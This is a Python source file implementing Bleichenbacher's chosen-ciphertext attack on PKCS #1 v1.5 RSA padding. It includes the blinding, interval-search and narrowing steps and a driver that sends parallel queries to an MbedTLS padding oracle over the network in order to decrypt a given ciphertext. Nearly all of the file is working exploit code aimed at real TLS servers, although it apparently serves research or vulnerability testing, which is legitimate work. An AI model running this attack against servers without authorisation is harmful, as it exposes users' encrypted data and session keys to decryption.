"""
Chosen-ciphertext attack on PKCS #1 v1.5
http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
"""
from oracles import MbedTLS_Oracle
from attack_args import parse_args, read_pubkey
from PKCS_1_5 import parse
import os


verbosity = 0
total_queries = 0

def egcd(a, b):
    """
    Use Euclid's algorithm to find gcd of a and b
    """
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
        return g, x - (b // a) * y, y


def modinv(a, m):
    """
    Compute modular inverse of a over m
    """
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


def divceil(a, b):
    """
    Accurate division with ceil, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: ceil(a / b)
    """
    q, r = divmod(a, b)
    if r:
        return q + 1
    return q


def divfloor(a, b):
    """
    Accurate division with floor, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: floor(a / b)
    """
    q, r = divmod(a, b)
    return q


def merge_intervals(intervals):
    """
    Given a list of intervals, merge them into equivalent non-overlapping intervals
    :param intervals: list of tuples (a, b), where a <= b
    :return: list of tuples (a, b), where a <= b and a_{i+1} > b_i
    """
    intervals.sort(key=lambda x: x[0])

    merged = []
    curr = intervals[0]
    high = intervals[0][1]

    for interval in intervals:
        if interval[0] > high:
            merged.append(curr)
            curr = interval
            high = interval[1]
        else:
            high = max(high, interval[1])
            curr = (curr[0], high)
    merged.append(curr)
    return merged


def one_query(oracle, content):
    oracle.add_query(None, content)
    _, result = oracle.wait_query()
    return result


def blinding(k, key, c, oracle):
    """
    Step 1 of the attack
    :param k: length of block in bytes
    :param key: RSA key
    :param c: integer smaller than n
    :param oracle: oracle that checks ciphertext conformity
    :return: integers s_0, c_0 s.t. c_0 represents a conforming encryption and c_0 = (c * (s_0) ** e) mod n
    """
    global total_queries
    if verbosity > 0:
        total_queries += 1
    if one_query(oracle, c.to_bytes(k, byteorder='big')):
        return 1, c
    while True:
        s_0 = os.urandom(k)
        s_0 = int.from_bytes(s_0, byteorder='big') % key.n
        # Check if c_0 as defined in the attack conforms and return it if it does.
        c_0 = (c * pow(s_0, key.e, key.n)) % key.n
        if verbosity > 0:
            total_queries += 1
        if one_query(oracle, c_0.to_bytes(k, byteorder='big')):
            return s_0, c_0


def s_c_conform(key, c, s, oracle, k, num_queries=None):
    global total_queries
    if num_queries is None:
        num_queries = len(oracle)
    if verbosity > 0:
        total_queries += num_queries
    for i in range(num_queries):
        oracle.add_query(i, ((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
    retval = -1
    for _ in range(num_queries):
        i, result = oracle.wait_query()
        if result and retval == -1:
            retval = s + i
    return retval

def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
    """
    Step 2.a and 2.b of the attack
    :param key: RSA key
    :param c_0: integer that represents a conforming ciphertext
    :param min_s: minimal s to run over
    :param oracle: oracle that checks ciphertext conformity
    :return: smallest s >= min_s s.t. (c_0 * (s ** e)) mod n represents a conforming ciphertext
    """
    # k may be given as an argument, but as we added this argument ourselves, we want to make sure
    #      that the function can be called without it, in which case we use the global variable k
    if k_arg is None:
        k_arg = k
    # Find the minimal s_i >= min_s such that the expression defined in the attack conforms.
    s_i = min_s
    while True:
        res = s_c_conform(key, c_0, s_i, oracle, k_arg)
        if res != -1:
            return res
        s_i += len(oracle)


def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
    """
    Step 2.c of the attack
    :param key: RSA key
    :param B: 2 ** (8 * (k - 2))
    :param prev_s: s value of previous round
    :param a: minimum of interval
    :param b: maximum of interval
    :param c_0: integer that represents a conforming ciphertext
    :param oracle: oracle that checks ciphertext conformity
    :return: s s.t. (c_0 * (s ** e)) mod n represents a conforming ciphertext
    """
    if k_arg is None:
        k_arg = k
    start_r = divceil(2 * (b * prev_s - 2 * B), key.n)
    r_i = start_r
    while True:
        start_s = divceil(2 * B + r_i * key.n, b)
        end_s = divfloor(3 * B + r_i * key.n, a) + 1
        # if end_s is an integer (i.e. a divides the dividend), we don't want to include it.
        end_s -= int(egcd(3 * B + r_i * key.n, a) == a)
        s_i = start_s
        while s_i < end_s:
            res = s_c_conform(key, c_0, s_i, oracle, k_arg)
            if res != -1:
                return res
            s_i += len(oracle)
        r_i += 1


def narrow_m(key, m_prev, s, B):
    """
    Step 3 of the attack
    :param key: RSA key
    :param m_prev: previous range
    :param s: s value of the current round
    :param B: 2 ** (8 * (k - 2))
    :return: New narrowed-down intervals
    """
    intervals = []
    for a, b in m_prev:
        min_r = divceil(a * s - 3 * B + 1, key.n)
        max_r = divfloor(b * s - 2 * B, key.n)
        for r in range(min_r, max_r + 1):
            start = max(a, divceil(2 * B + r * key.n, s))
            end = min(b, divfloor(3 * B - 1 + r * key.n, s))
            intervals.append((start, end))

    return merge_intervals(intervals)


def bleichenbacher_attack(k, key, c, oracle):
    """
    Given an RSA public key and an oracle for conformity of PKCS #1 encryptions, along with a value c, calculate m = (c ** d) mod n
    :param k: length of ciphertext in bytes
    :param key: RSA public key
    :param c: input parameter
    :param oracle: oracle that checks ciphertext conformity
    :return: m s.t. m = (c ** d) mod n
    """
    B = 2 ** (8 * (k - 2))

    c = int.from_bytes(c, byteorder="big")
    s_0, c_0 = blinding(k, key, c, oracle)

    print("Blinding complete")

    m = [(2 * B, 3 * B - 1)]

    i = 1
    while True:
        if verbosity > 0:
            print("Round ", i, " (total queries %d)" % total_queries)
        else:
            print("Round ", i)
        if i == 1:
            s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracle, k_arg=k)
        elif len(m) > 1:
            s = find_min_conforming(key, c_0, s + 1, oracle, k_arg=k)
        else:
            a = m[0][0]
            b = m[0][1]
            s = search_single_interval(key, B, s, a, b, c_0, oracle, k_arg=k)

        m = narrow_m(key, m, s, B)

        if len(m) == 1 and m[0][0] == m[0][1]:
            result = (m[0][0] * modinv(s_0, key.n)) % key.n
            break
        i += 1

    # Test the result
    if pow(result, key.e, key.n) == c:
        return result.to_bytes(k, byteorder='big')
    else:
        return None

if __name__ == "__main__":
    args = parse_args()
    verbosity = args.verbose
    k = int(args.n_length / 8)
    with open(args.public_key, "rb") as keyfile:
        pub_key = read_pubkey(keyfile, k)

    oracle = MbedTLS_Oracle(addr=args.server_addr, port=args.server_port, stage=args.stage,
                            num_servers=args.num_servers)

    if args.given_enc is not None:
        with open(args.given_enc, "rb") as f:
            c = f.read()
    else:
        c = b'\x00' + (k - 1) * bytes([1])

    result = bleichenbacher_attack(k, pub_key, c, oracle)
    print(result)
    if result is not None:
        print("Unpadded:")
        print(parse(result).hex())

